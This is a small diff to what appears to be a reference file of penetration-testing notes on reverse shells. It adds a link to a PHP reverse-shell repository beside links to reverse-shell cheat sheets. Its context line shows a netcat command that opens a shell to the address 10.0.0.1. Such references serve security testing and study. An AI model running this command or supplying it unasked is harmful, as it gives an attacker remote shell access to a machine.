@@ -40,3 +40,5 @@ nc -e /bin/sh 10.0.0.1 1234
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 https://highon.coffee/blog/reverse-shell-cheat-sheet
+
+https://github.com/pentestmonkey/php-reverse-shell
